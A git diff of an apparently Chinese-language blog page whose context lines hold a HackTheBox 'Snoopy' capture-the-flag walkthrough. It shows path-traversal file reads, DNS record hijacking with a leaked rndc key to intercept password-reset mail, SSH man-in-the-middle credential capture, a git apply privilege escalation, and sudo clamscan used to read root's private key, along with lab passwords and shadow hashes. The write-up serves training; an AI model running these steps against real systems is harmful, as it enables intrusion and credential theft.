@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Snoopy 10.10.11.212   端口扫描22，53，80: 1234567891011121314151617181920$ nmap -sC -sV -Pn 10.10.11.212Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-05-08 16:06 C">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Snoopy 10.10.11.212                                                                                                              端口扫描22，53，80: 1234567891011121">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Snoopy - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/05/09/Snoopy-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Snoopy 10.10.11.212   端口扫描22，53，80: 1234567891011121314151617181920$ nmap -sC -sV -Pn 10.10.11.212Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-05-08 16:06 C">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Snoopy 10.10.11.212                                                                                                              端口扫描22，53，80: 1234567891011121">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050806.jpg">
@@ -140,7 +140,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -229,7 +229,14 @@
 <li><a href="https://app.hackthebox.com/machines/Snoopy" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Snoopy</a></li>
 <li>10.10.11.212</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050801.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22，53，80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.212</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 16:06 CST</span><br><span class="line">Nmap scan report for 10.10.11.212</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)</span><br><span class="line">|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: SnoopySec Bootstrap Template - Index</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 59.82 seconds</span><br></pre></td></tr></table></figure>
 
@@ -238,23 +245,58 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>链接里得到域名，加hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.212 snoopy.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050802.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><p>contact里提到mail暂时离线：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050806.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>子域名发现mm:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://snoopy.htb/" -H 'Host: FUZZ.snoopy.htb' -fs 23418</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 200ms]</span><br><span class="line">    * FUZZ: mm</span><br></pre></td></tr></table></figure>
 
 <h2 id="mm-snoopy-htb"><a href="#mm-snoopy-htb" class="headerlink" title="mm.snoopy.htb"></a>mm.snoopy.htb</h2><p>添加hosts后访问，是一个Mattermost：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050803.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>但没开外部注册</p>
 <h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>回到主站，存在一个下载功能，简单测试发现存在LFI，基础双写绕过，下载下来是一个压缩包，解压得到读取内容：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_path="/etc/passwd"</span><br><span class="line">curl "http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//..../$file_path" -o output.zip</span><br><span class="line"></span><br><span class="line">unzip output.zip</span><br><span class="line">cat press_package/$file_path</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050804.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>后面就是一步步读文件,例如前面端口和主站都有提到dns，就可以读dns配置文件：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;bind&#x2F;named.conf</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050805.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="named-conf"><a href="#named-conf" class="headerlink" title="named.conf"></a>named.conf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// This is the primary configuration file for the BIND DNS server named.</span><br><span class="line">//</span><br><span class="line">// Please read /usr/share/doc/bind9/README.Debian.gz for information on the</span><br><span class="line">// structure of BIND configuration files in Debian, *BEFORE* you customize</span><br><span class="line">// this configuration file.</span><br><span class="line">//</span><br><span class="line">// If you are just adding zones, please do that in /etc/bind/named.conf.local</span><br><span class="line"></span><br><span class="line">include "/etc/bind/named.conf.options";</span><br><span class="line">include "/etc/bind/named.conf.local";</span><br><span class="line">include "/etc/bind/named.conf.default-zones";</span><br><span class="line"></span><br><span class="line">key "rndc-key" &#123;</span><br><span class="line">    algorithm hmac-sha256;</span><br><span class="line">    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 
@@ -268,22 +310,85 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 本地开启smtp监听，用于后面接收邮件内容</span></span><br><span class="line">sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.13:25</span><br><span class="line"></span><br><span class="line">export HMAC="hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="</span><br><span class="line">nsupdate -y $HMAC</span><br><span class="line"></span><br><span class="line">server 10.10.11.212</span><br><span class="line">update add mail.snoopy.htb.   900  IN  A 10.10.14.13</span><br><span class="line">send</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050807.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>  然后去mm那里忘记密码发送找回邮件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sbrown@snoopy.htb</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 小坑，删除URL里的3D和=</span></span><br><span class="line">Reset Password http://mm.snoopy.htb/reset_password_complete?token=4f5x4ogxb7q1pgccrzh717kzkuyg9cq4ngt9z1xba4uuxze9tjo77spoyi5fzgya</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050808.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050809.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050810.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050810.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>重置成功，登录mm：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050811.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050811.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="mm"><a href="#mm" class="headerlink" title="mm"></a>mm</h1><p>mm里提供一些额外命令</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050812.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050812.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="server-provision"><a href="#server-provision" class="headerlink" title="server_provision"></a>server_provision</h2><p>看起来是操作服务器的：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050813.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050813.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>输入参数测试，有连接过来,根据banner知道用的是Paramiko进行的ssh连接：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050814.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050815.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050814.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050815.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="ssh-mitm"><a href="#ssh-mitm" class="headerlink" title="ssh-mitm"></a>ssh-mitm</h2><p>因为直接nc没法完成模拟完整的ssh交互，所以使用这个：</p>
 <ul>
 <li>SSH-MITM - ssh audits made simple — SSH-MITM<br><a href="https://docs.ssh-mitm.at/" target="_blank" rel="noopener">https://docs.ssh-mitm.at/</a></li>
@@ -291,27 +396,76 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install ssh-mitm</span><br><span class="line"></span><br><span class="line">cbrown@snoopy.htb</span><br><span class="line"></span><br><span class="line">python3 -m sshmitm server --enable-trivial-auth --remote-host 10.10.11.212 --listen-port 2222</span><br></pre></td></tr></table></figure>
 
 <p>remote设置成靶机ip，让mm那里连到我们的2222端口再转发到靶机的22端口，得到cbrown ssh账号密码：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050816.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050816.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="cbrown"><a href="#cbrown" class="headerlink" title="cbrown"></a>cbrown</h1><p>cbrown ssh登录,下一步应该是要通过git到sbrown：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Remote Address: 10.10.11.212:22</span><br><span class="line">Username: cbrown</span><br><span class="line">Password: sn00pedcr3dential!!!</span><br><span class="line">Agent: no agent</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050817.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050817.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="git-apply"><a href="#git-apply" class="headerlink" title="git apply"></a>git apply</h2><p>这个命令是用来应用补丁的，可以通过补丁来修改文件，那就可以去修改sbrown的文件例如写一个公钥进去</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取一个正常的diff格式，基于这个修改</span></span><br><span class="line">cd /home</span><br><span class="line">git diff cbrown/.bash_history cbrown/.ssh/authorized_keys &gt; /tmp/diff</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改其中的用户名为sbrown，添加公钥内容</span></span><br><span class="line">vim /tmp/diff</span><br><span class="line"></span><br><span class="line">chmod 777 /home/cbrown</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 应用补丁，写入公钥</span></span><br><span class="line">sudo -u sbrown /usr/bin/git apply /tmp/diff</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050818.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050818.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="tmp-diff"><a href="#tmp-diff" class="headerlink" title="/tmp/diff"></a>/tmp/diff</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/cbrown/.bash_history b/cbrown/.bash_history</span><br><span class="line">deleted file mode 120000</span><br><span class="line">index dc1dc0c..0000000</span><br><span class="line"><span class="comment">--- a/cbrown/.bash_history</span></span><br><span class="line"><span class="comment">+++ /dev/null</span></span><br><span class="line">@@ -1 +0,0 @@</span><br><span class="line"><span class="deletion">-/dev/null</span></span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/sbrown/.ssh/authorized_keys b/sbrown/.ssh/authorized_keys</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..e69de29</span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/sbrown/.ssh/authorized_keys</span></span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line"><span class="addition">+ssh-rsa AAAAAAAAA</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>写入公钥到sbrown后ssh连接：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050819.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050819.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h2><p>sudo运行clamscan,查看可用参数</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050820.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050820.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>测试发现-f指定文件列表扫描，会把文件内容打印出来，因为他把文件当成列表，去把每一行当成要扫描的文件名，从而产生错误输出：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050821.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050821.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>那就直接去读ssh私钥了, 修复格式麻烦点：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/bin/clamscan -f /root/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line">ssh -i root_id_rsa root@10.10.11.212</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050822.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023050822.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$rU7hOwTnG6BpC3LHixl.d.$Bs2WEl7oZNFwYFWNGvW5WPrBf59XWJbulWaR.EVO1y4:19442:0:99999:7:::</span><br><span class="line">cbrown:$y$j9T$klyE893ZriSjZmbfTicAH&#x2F;$5P0yN9&#x2F;M5&#x2F;vPn8a.VSWukMywVwVV&#x2F;FS6hUYFDIM3DWC:19443:0:99999:7:::</span><br><span class="line">sbrown:$y$j9T$CpZTLLqOGPxaXw8KJm8Nv.$HOBA7HQe2Ie7WybP3cjf42VTgIcY6RwN0glhXfjG9k6:19435:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
